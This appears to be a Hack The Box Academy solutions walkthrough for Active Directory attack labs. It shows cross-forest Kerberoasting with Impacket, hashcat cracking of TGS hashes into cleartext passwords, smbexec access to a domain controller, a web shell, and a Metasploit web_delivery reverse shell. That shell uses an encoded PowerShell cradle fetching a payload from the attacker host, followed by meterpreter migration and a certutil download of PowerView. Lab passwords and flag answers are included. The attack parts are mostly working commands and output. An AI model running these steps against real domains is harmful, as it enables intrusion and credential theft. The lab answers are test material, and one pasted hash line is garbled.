### "Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc."

After spawning the target machine, students first need to connect to it with `SSH` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[us-academy-1]─[10.10.14.61]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.206.246

htb-student@10.129.206.246's password:

Linux ea-attack01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _\` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|

Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15

┌─[htb-student@ea-attack01]─[~]
└──╼ $
```

Students then need to use `GetUserSPNs.py`, supplying it the credentials `wley:transporter@4`:

Code: shell

```shell
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT/wley
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT/wley

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               
HTTP/sapsso.FREIGHTLOGISTICS.LOCAL   sapsso    CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never>              
```

From the output, students will know that the other account with an `SPN` aside from `mssqlsvc` is `sapsso`.

Answer: `sapsso`

# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

## Question 2

### "Crack the TGS and submit the cleartext password as your answer."

Using the same SSH connection established in the previous question, students need to use `GetUsersSPNs`, supplying it the credentials `wley:transporter@4`:

Code: shell

```shell
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL -request-user sapsso INLANEFREIGHT.LOCAL/wley
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL -request-user sapsso INLANEFREIGHT.LOCAL/wley

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                Name    MemberOf                                                PasswordLastSet             LastLogon  Delegation 
----------------------------------  ------  ------------------------------------------------------  --------------------------  ---------  ----------
HTTP/sapsso.FREIGHTLOGISTICS.LOCAL  sapsso  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never>               

$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$27b5e2726f7c8d87470dc5c768531baf$2a10f36b3ad51260581175e9eb893b7e8b486b10cde5a4900678135297bd5f7fa6d9a455ac69a3996b31d43684c48b496b4de0d41e76aa4b58cfd8638536aebfe5af17994c14e5a86c269a7480862c44cdfb576278b5c544e36fed5fccfdfc0d7f89fed1e32743e64488f2f964e2acfb9348027a9cdf136393de809dbeeddd9c76c7aacb532a6e446dcf216ad4616bb901f11a8470742ff1cd4fcea2884d71feeaa78fad908b5c67525aba50e76a92319e8483befa6b2f4f718e03110c539839173bd6c83ab328267e50c7dbb429b2c51288c72f828bc14d67bc0956589ee8702d314f48ab35656807403e396c5ed2d3414443a9b243a84780b6c64b1969e942381768cbdde63f7fa2e865ac56a9dcd3288bed6a6d0d97cd7e361eaa4e601adeccb67ca4570fc9065f2404213875999f0ad600f0fd1eface8adab044e66ef7382e4a2dee93d59e4d09e4a5c533afa17aa5bdfc0e4a1cc86e6b88f457691df080c8c6096d3bb95d7a123f6cee27fa923d25a9173787f06e3f16956eb4d6c6269c4ff29bb1b434ce3afa4d32e91fc7b9b66898b7597a1730985584d4290e59a54acf29fa2639755c05de6b671dadbeace908d90cee302d997da6b52fbf8cb5b39cdafd6f9f9a9ab3d6a95c7731ba1168c7e27649b6c635b34a1ee5442feed04702a9175fc68883b6529cd612a9131aca887c06f7f6a1cdcd5cac9f28b7eb768b96f2e8841d67124139143c2719facb153ca11eff252658913417ef3a54b940214d1257781f15e3feedd175feb2284babf3095aaa92a3a202f86245988404de65d0932650f8997fdcff3e382a7eb514c29950534598efc2f12bc75b46860f050d7613fcd1e97448a37ddb875d6bf9b6b90f77c5b2aec42c61accf5adb1e53d0a8a544dc5423289a5e25f5032225b353b44e1c0f5652f0539d380137153a8ab615f04b5b814ba051bb09600d2cab29686f9fd767950d2456c628d19674129b7b6df543501c22940aacf2cb8dcee86e2749779a8508c3a1b1db697b9533b1724414927c7530abd517d262987655d6de654cf9f8cb6f2c5a7c1ff86f26d644fe691b0f68db5b5ca02e2f6a19f65208b483f2b6c8658519ef36ce1babfd908d46917e61d31a20aea3d94f3de1e6beaa206600c80e41c6a0c31bf9a47ce944e8d58f3b4838eb6fd8fabc8d94d11ffa2c70e2441d9f1ae17963513d47ccfd76dc7dc8003de7c741d7b80ed7d85ca147d866ea45ad9ac5a0b683fffacba1939c63ceda1f4572738f51741355f5dec4483ee65d8a404f7e805ef4a73e4381a2d7302f3afed235130180d9c7ccb1db9d4752cc8e4a4c51eb7560b3bfce2c549b8477451b5bf5abf373cec1ac1f32b6544be208141fc2e1b183149c763a26f255bf8178e003989477abc56d2c286f543b42b03a2b02bf3e640744504e85489b6bb8a71abde122da91491d3bb4e9be
```

Students need to then save the hash into a file in `Pwnbox`/`PMVPN` to subsequently crack it using `Hashcat`, utilizing hashmode 13100; students will find out that the plaintext password of the cracked hash is `pabloPICASSO`:

Code: shell

```shell
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ hashcat hash.txt -m 13100 -w 3 -O /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$27b5e2726f7c8d87470dc5c768531baf$2a10f36b3ad51260581175e9eb893b7e8b486b10cde5a4900678135297bd5f7fa6d9a455ac69a3996b31d43684c48b496b4de0d41e76aa4b58cfd8638536aebfe5af17994c14e5a86c269a7480862c44cdfb576278b5c544e36fed5fccfdfc0d7f89fed1e32743e64488f2f964e2acfb9348027a9cdf136393de809dbeeddd9c76c7aacb532a6e446dcf216ad4616bb901f11a8470742ff1cd4fcea2884d71feeaa78fad908b5c67525aba50e76a92319e8483befa6b2f4f718e03110c539839173bd6c83ab328267e50c7dbb429b2c51288c72f828bc14d67bc0956589ee8702d314f48ab35656807403e396c5ed2d3414443a9b243a84780b6c64b1969e942381768cbdde63f7fa2e865ac56a9dcd3288bed6a6d0d97cd7e361eaa4e601adeccb67ca4570fc9065f2404213875999f0ad600f0fd1eface8adab044e66ef7382e4a2dee93d59e4d09e4a5c533afa17aa5bdfc0e4a1cc86e6b88f457691df080c8c6096d3bb95d7a123f6cee27fa923d25a9173787f06e3f16956eb4d6c6269c4ff29bb1b434ce3afa4d32e91fc7b9b66898b7597a1730985584d4290e59a54acf29fa2639755c05de6b671dadbeace908d90cee302d997da6b52fbf8cb5b39cdafd6f9f9a9ab3d6a95c7731ba1168c7e27649b6c635b34a1ee5442feed04702a9175fc68883b6529cd612a9131aca887c06f7f6a1cdcd5cac9f28b7eb768b96f2e8841d67124139143c2719facb153ca11eff252658913417ef3a54b940214d1257781f15e3feedd175feb2284babf3095aaa92a3a202f86245988404de65d0932650f8997fdcff3e382a7eb514c29950534598efc2f12bc75b46860f050d7613fcd1e97448a37ddb875d6bf9b6b90f77c5b2aec42c61accf5adb1e53d0a8a544dc5423289a5e25f5032225b353b44e1c0f5652f0539d380137153a8ab615f04b5b814ba051bb09600d2cab29686f9fd767950d2456c628d19674129b7b6df543501c22940aacf2cb8dcee86e2749779a8508c3a1b1db697b9533b1724414927c7530abd517d262987655d6de654cf9f8cb6f2c5a7c1ff86f26d644fe691b0f68db5b5ca02e2f6a19f65208b483f2b6c8658519ef36ce1babfd908d46917e61d31a20aea3d94f3de1e6beaa206600c80e41c6a0c31bf9a47ce944e8d58f3b4838eb6fd8fabc8d94d11ffa2c70e2441d9f1ae17963513d47ccfd76dc7dc8003de7c741d7b80ed7d85ca147d866ea45ad9ac5a0b683fffacba1939c63ceda1f4572738f51741355f5dec4483ee65d8a404f7e805ef4a73e4381a2d7302f3afed235130180d9c7ccb1db9d4752cc8e4a4c51eb7560b3bfce2c549b8477451b5bf5abf373cec1ac1f32b6544be208141fc2e1b183149c763a26f255bf8178e003989477abc56d2c286f543b42b03a2b02bf3e640744504e85489b6bb8a71abde122da91491d3bb4e9be:pabloPICASSO
```

Answer: `pabloPICASSO`

# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

## Question 3

### "Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop."

Students first need to use `smbexec` to log in to `ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL`, utilizing the credentials `sapsso:pabloPICASSO`:

Code: shell

```shell
smbexec.py freightlogistics/sapsso@freightlogistics.local
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $smbexec.py freightlogistics/sapsso@freightlogistics.local

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[!] Launching semi-interactive shell - Careful what you execute
```

At last, students need to print out the contents of the flag file "flag.txt" at `C:\users\administrator\desktop\flag.txt`:

Code: powershell

```powershell
type C:\users\administrator\desktop\flag.txt
```

```
C:\Windows\system32>type C:\users\administrator\desktop\flag.txt

burn1ng_d0wn_th3_f0rest!
```

Answer: `burn1ng_d0wn_th3_f0rest!`

# Additional AD Auditing Techniques

## Question 1

### "Take some time to experiment with the tools from this section with the spawned target. When done, enter COMPLETE as the answer to this question."

Students are highly encouraged to experiment with the tools from this section against the spawned target machine. After doing so, students need to answer with `COMPLETE`.

Answer: `COMPLETE`

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 1

### "Submit the contents of the flag.txt file on the administrator Desktop of the web server"

Students need to read the scenario to learn about the web shell located at `/uploads/`, and then access the web shell at the `http://STMIP/uploads/antak.aspx` with the credentials `admin:My_W3bsH3ll_P@ssw0rd!`:

![[HTB Solutions/CAPE/z. images/30063bd86b9768ee4dc4392435938049_MD5.jpg]]

Students need to use the web-based PowerShell to read the first flag from `c:\users\administrator\desktop\flag.txt`:

Code: powershell

```powershell
cat c:\users\administrator\desktop\flag.txt
```

```
PS> cat c:\users\administrator\desktop\flag.txt

JusT_g3tt1ng_st@rt3d!
```

Answer: `JusT_g3tt1ng_st@rt3d!`

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 2

### "Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer"

Students need to elevate their functionalities by getting a reverse shell, using `msfconsole` and the `web_delivery` exploit:

Code: shell

```shell
sudo msfconsole -q
search web_delivery
use 1
```

```
┌─[us-academy-2]─[10.10.14.13]─[htb-ac543@htb-xmfpdttaiy]─[~]
└──╼ [★]$ sudo msfconsole -q

[msf](Jobs:0 Agents:0) >> search web_delivery

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   1  exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery

Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/script/web_delivery

[msf](Jobs:0 Agents:0) >> use 1
[*] Using configured payload python/meterpreter/reverse_tcp
```

Then, students need to set the options of the module accordingly:

Code: shell

```shell
set payload windows/x64/meterpreter/reverse_tcp
set LHOST PWNIP
set SRVHOST PWNIP
set TARGET 2
exploit
```

```
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set payload windows/x64/meterpreter/reverse_tcp

payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set LHOST 10.10.14.13
LHOST => 10.10.14.13
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set SRVHOST 10.10.14.13
SRVHOST => 10.10.14.13
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set TARGET 2
TARGET => 2
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] Using URL: http://10.10.14.13:8080/EsPk6AcDPr
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABpAHIAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAaQByAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAaQByAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAzADoAOAAwADgAMAAvAEUAcwBQAGsANgBBAGMARABQAHIALwB6AHMARAA1AFMAVQB0AG0ASAAyAHYASwBWACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADMAOgA4ADAAOAAwAC8ARQBzAFAAawA2AEEAYwBEAFAAcgAnACkAKQA7AA==
```

Students need to copy and paste the encoded PowerShell command into the `Antak` web shell. Checking `msfconsole`, students will see a `meterpreter` session has been opened. Next, students need to enumerate processes and migrate `meterpreter` to a more stable process, `winlogon.exe`:

Code: shell

```shell
ps
getpid
migrate <winlogin.exe pid>
```

```
meterpreter > ps

Process List
============
PID   PPID  Name         Arch  Session  User               Path
---   ----  ----         ----  -------  ----               ----
0     0     [System Pro
cess]
4     0     System       x64   0
104   4     Registry     x64   0
312   4     smss.exe     x64   0
368   648   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
L SERVICE          2\svchost.exe
396   388   csrss.exe    x64   0
504   388   wininit.exe  x64   0
512   496   csrss.exe    x64   1
568   496   winlogon.ex  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
e                           EM                 2\winlogon.exe
624   648   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3

meterpreter > getpid
Current pid: 2868
meterpreter > migrate 568
[*] Migrating from 2868 to 568...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Subsequently, students need to transfer [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to the WEB01 machine, starting a Python web server from `Pwnbox`/`PMVPN`:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
python3 -m http.server PWNPO
```

```
┌─[us-academy-2]─[10.10.14.13]─[htb-ac543@htb-xmfpdttaiy]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
┌─[us-academy-2]─[10.10.14.13]─[htb-ac543@htb-xmfpdttaiy]─[~]
└──╼ [★]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

From the WEB01 `meterpreter`, students need to drop to a command shell and download `PowerView` using `certutil.exe`. Finally, students can import the module and search for domain users with SPNs; students will find `svc_sql` as the Kerberoastable account:

Code: shell

```shell
shell
cd C:\
certutil.exe -f -urlcache -split http://PWNIP:PWNPO/PowerView.ps1 PowerView.ps1
powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN | select samaccountname
```

```
(Meterpreter 1)(C:\Windows\system32) > shell

Process 3840 created.
Channel 4 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\
cd C:\

C:\>certutil.exe -f -urlcache -split http://10.10.14.13:8000/PowerView.ps1 PowerView.ps1
certutil.exe -f -urlcache -split http://10.10.14.13:8000/PowerView.ps1 PowerView.ps1
****  Online  ****
  000000  ...
  0bc0e7
CertUtil: -URLCache command completed successfully.

C:\>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\> Import-Module .\PowerView.ps1
Import-Module .\PowerView.ps1
PS C:\> Get-DomainUser * -SPN | select samaccountname
Get-DomainUser * -SPN | select samaccountname

samaccountname
--------------
azureconnect  
backupjob     
krbtgt        
sqltest       
sqlqa         
sqldev        
svc_sql       
sqlprod       
```

Answer: `svc_sql`

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 3

### "Crack the account's password. Submit the cleartext value."

Using the previously established `meterpreter` session, students need to kerberoast the `svc_sql` account to obtain its hash:

Code: shell

```shell
Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat
```

```
PS C:\> Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat
Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat

SamAccountName       : svc_sql
DistinguishedName    : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/SQL01.inlanefreight.local:1433
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$0A3867FF933AD2
                       5DED73373BEE0B3FB9$1977669A45F691C9FBC9F874DF7D76DB563578A2D15BB8D9FAE83777C118C161B2FBF3A95BB20
                       7E852624D2445290D2DB263E323EC51D01AD05F65F4B3B026FE4D8AAA47075630A838304BC6B9EF3AE1C812C8B3D98F6
                       77F78980E534D09539C244D7265A7CE5AB6EB4199C7E1FA948F9D2694B3B50A712925E87C45D1E124F5594810D188188
                       E5B8CAC54AF0C53D5EFF2B4049E25687F4EA1139F0C3D3DE0B1CB564EDAD172A537A8850D63C1C77E8920046EFB26241
                       BF3F7B161ADA3B2BC4A742950F173AD93B4559F3855DB73059239D22280CC7A93F3890932D885A3C30BA6AB21688CEB7
                       7889A06FF33914CCB29AD3B201A5D83DACD40E2683A0A4AB9B0CC6D749B18E66D43E02DE9F628ADE9E4B88B410EE6523
                       268450793C9B4AFE28E0DEDA975740200F0C9E9FFE9627EE91E7915FD9144BC605BF6C05B38CBC8B3DB59F81458ECE08
                       3BE115AE9D0CEFB20DA896E39D3DC67355495FD00EE8853EED2189C1A7F2FCEDD0B86E3C1AC1B9D8D5E9F23B33BCB84B
                       54268A83826EA653C1767B0EE0E31D8AA13DB3DF9BFEEBBEF3B033659CF98904229FCADDBB57F1C78AFB548EDB2D0392
                       84F76933F5043D3EBD9C964559AF8EF31C42CBC3398604C3A3DD568E1036DF3D91195DA1683A9BB07D5C0FE34D6E9EEE
                       2F0BEE5ADF636547CB57DD2427517340A68BA2F865264846DE286B394642FC7AC279639B8CDF17A2FE4805D6AD2B6C52
                       DD11552F13CD8606D2AEDD3E853E34242BB7622331EE1E9CF4FA666F1276FF0FFB9ED081EB4CD0BCA3E0CE585D2F7025
                       7E8EB7E99C36403BC4F7356603D6A614572DB48CD9A2021CCDB3E875DABB06040FEB8621D77101931CBF66FF045A212F
                       E7BC43917EA0BB734A8BAAAFC77814D4AF11B347232FB3A5B7A653650CEF3FDC78B6B91101F6FBE29232047570FD4996
                       069B4661BE82E19A52059138B96B93C3BA5ED725BCD5D04441159872B6AA01170CAEDB3456CA6F4C7992ADBB35FC1C48
                       4763504AD35D54B079E8A5102C3233C600E38270CE6447697D9A8718BB1ACFED214D6B1D2676B245BD6BC3A217F66E72
                       AFE907E4DCCED8CB86EA978A7A1C429D6731E32A04E2F20B4E3F608C220DF4360CCE80F2EDE10729D1332F482F718DEC
                       637C70E1BC801ACDCDEEB804E2E569F80F9032932EA632DB286B3DFCB9CD7DEED5C751D412A4F1B9D184EEBE5C68162E
                       5DB94EADA75C3607189ADFFE71A58C4F528418B4D20081DAC73A69130FCC2E898A5DB96619311003B0F1993BC724652A
                       9B37DB5B99DC4B29B7CC2A61DB4B177A7219082B2FF0BCD16573E079249D31FD71FDCFB6BE069BF8569954E368E6194B
                       DCDCFDB705F6C25372A7DA6A0AEDBA680FE4DBC69FC2EEA15EF805B2B2F19BD9B52EB385B51E181CA08583A1C058451A
                       DB784CA3E6BCC9D8865F8B710F1E052D5D42866C8C1E361AAECA224082A8B62700C0026E4FF6841FA4CC66C4794CCFAD
                       3DC72AEBCD8B080F12278813442C36B3E0874FBAF7C0B404BDD4D03A333C81A0B9B
```

Students need to copy the hash, and then paste into a file, formatting it to remove additional spaces:

Code: shell

```shell
echo "$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$0A3867FF933AD2
                       5DED73373BEE0B3FB9$1977669A45F691C9FBC9F874DF7D76DB563578A2D15BB8D9FAE83777C118C161B2FBF3A95BB20
                       7E852624D2445290D2DB263E323EC51D01AD05F65F4B3B026FE4D8AAA47075630A838304BC6B9EF3AE1C812C8B3D98F6
                       77F78980E534D09539C244D7265A7CE5AB6EB4199C7E1FA948F9D2694B3B50A712925E87C45D1E124F5594810D188188
                       E5B8CAC54AF0C53D5EFF2B4049E25687F4EA1139F0C3D3DE0B1CB564EDAD172A537A8850D63C1C77E8920046EFB26241
                       BF3F7B161ADA3B2BC4A742950F173AD93B4559F3855DB73059239D22280CC7A93F3890932D885A3C30BA6AB21688CEB7
                       7889A06FF33914CCB29AD3B201A5D83DACD40E2683A0A4AB9B0CC6D749B18E66D43E02DE9F628ADE9E4B88B410EE6523
                       268450793C9B4AFE28E0DEDA975740200F0C9E9FFE9627EE91E7915FD9144BC605BF6C05B38CBC8B3DB59F81458ECE08
                       3BE115AE9D0CEFB20DA896E39D3DC67355495FD00EE8853EED2189C1A7F2FCEDD0B86E3C1AC1B9D8D5E9F23B33BCB84B
                       54268A83826EA653C1767B0EE0E31D8AA13DB3DF9BFEEBBEF3B033659CF98904229FCADDBB57F1C78AFB548EDB2D0392
                       84F76933F5043D3EBD9C964559AF8EF31C42CBC3398604C3A3DD568E1036DF3D91195DA1683A9BB07D5C0FE34D6E9EEE
                       2F0BEE5ADF636547CB57DD2427517340A68BA2F865264846DE286B394642FC7AC279639B8CDF17A2FE4805D6AD2B6C52
                       DD11552F13CD8606D2AEDD3E853E34242BB7622331EE1E9CF4FA666F1276FF0FFB9ED081EB4CD0BCA3E0CE585D2F7025
                       7E8EB7E99C36403BC4F7356603D6A614572DB48CD9A2021CCDB3E875DABB06040FEB8621D77101931CBF66FF045A212F
                       E7BC43917EA0BB734A8BAAAFC77814D4AF11B347232FB3A5B7A653650CEF3FDC78B6B91101F6FBE29232047570FD4996
                       069B4661BE82E19A52059138B96B93C3BA5ED725BCD5D04441159872B6AA01170CAEDB3456CA6F4C7992ADBB35FC1C48
                       4763504AD35D54B079E8A5102C3233C600E38270CE6447697D9A8718BB1ACFED214D6B1D2676B245BD6BC3A217F66E72
                       AFE907E4DCCED8CB86EA978A7A1C429D6731E32A04E2F20B4E3F608C220DF4360CCE80F2EDE10729D1332F482F718DEC
                       637C70E1BC801ACDCDEEB804E2E569F80F9032932EA632DB286B3DFCB9CD7DEED5C751D412A4F1B9D184EEBE5C68162E
                       5DB94EADA75C3607189ADFFE71A58C4F528418B4D20081DAC73A69130FCC2E898A5DB96619311003B0F1993BC724652A
e                      3DC72AEBCD8B080F12278813442C36B3E0874FBAF7C0B404BDD4D03A333C81A0B9B" | tr -d "[:space:]"  > tgs_file
```

```
echo '$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$0A3867FF933AD2
                       5DED73373BEE0B3FB9$1977669A45F691C9FBC9F874DF7D76DB563578A2D15BB8D9FAE83777C118C161B2FBF3A95BB20
                       7E852624D2445290D2DB263E323EC51D01AD05F65F4B3B026FE4D8AAA47075630A838304BC6B9EF3AE1C812C8B3D98F6
                       77F78980E534D09539C244D7265A7CE5AB6EB4199C7E1FA948F9D2694B3B50A712925E87C45D1E124F5594810D188188
                       E5B8CAC54AF0C53D5EFF2B4049E25687F4EA1139F0C3D3DE0B1CB564EDAD172A537A8850D63C1C77E8920046EFB26241
                       BF3F7B161ADA3B2BC4A742950F173AD93B4559F3855DB73059239D22280CC7A93F3890932D885A3C30BA6AB21688CEB7
                       7889A06FF33914CCB29AD3B201A5D83DACD40E2683A0A4AB9B0CC6D749B18E66D43E02DE9F628ADE9E4B88B410EE6523
                       268450793C9B4AFE28E0DEDA975740200F0C9E9FFE9627EE91E7915FD9144BC605BF6C05B38CBC8B3DB59F81458ECE08
                       3BE115AE9D0CEFB20DA896E39D3DC67355495FD00EE8853EED2189C1A7F2FCEDD0B86E3C1AC1B9D8D5E9F23B33BCB84B
                       54268A83826EA653C1767B0EE0E31D8AA13DB3DF9BFEEBBEF3B033659CF98904229FCADDBB57F1C78AFB548EDB2D0392
                       84F76933F5043D3EBD9C964559AF8EF31C42CBC3398604C3A3DD568E1036DF3D91195DA1683A9BB07D5C0FE34D6E9EEE
                       2F0BEE5ADF636547CB57DD2427517340A68BA2F865264846DE286B394642FC7AC279639B8CDF17A2FE4805D6AD2B6C52
                       DD11552F13CD8606D2AEDD3E853E34242BB7622331EE1E9CF4FA666F1276FF0FFB9ED081EB4CD0BCA3E0CE585D2F7025
                       7E8EB7E99C36403BC4F7356603D6A614572DB48CD9A2021CCDB3E875DABB06040FEB8621D77101931CBF66FF045A212F
                       E7BC43917EA0BB734A8BAAAFC77814D4AF11B347232FB3A5B7A653650CEF3FDC78B6B91101F6FBE29232047570FD4996
                       069B4661BE82E19A52059138B96B93C3BA5ED725BCD5D04441159872B6AA01170CAEDB3456CA6F4C7992ADBB35FC1C48
                       4763504AD35D54B079E8A5102C3233C600E38270CE6447697D9A8718BB1ACFED214D6B1D2676B245BD6BC3A217F66E72
                       AFE907E4DCCED8CB86EA978A7A1C429D6731E32A04E2F20B4E3F608C220DF4360CCE80F2EDE10729D1332F482F718DEC
                       637C70E1BC801ACDCDEEB804E2E569F80F9032932EA632DB286B3DFCB9CD7DEED5C751D412A4F1B9D184EEBE5C68162E
                       5DB94EADA75C3607189ADFFE71A58C4F528418B4D20081DAC73A69130FCC2E898A5DB96619311003B0F1993BC724652A
e                      3DC72AEBCD8B080F12278813442C36B3E0874FBAF7C0B404BDD4D03A333C81A0B9B' | tr -d "[:space:]" > tgs_file
```

Finally, students need to crack the hash with `Hashcat`, utilizing hashmode 13100; the password is revealed to be `lucky7`:

Code: shell

```shell
hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt 
```

```
hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt 

<SNIP>

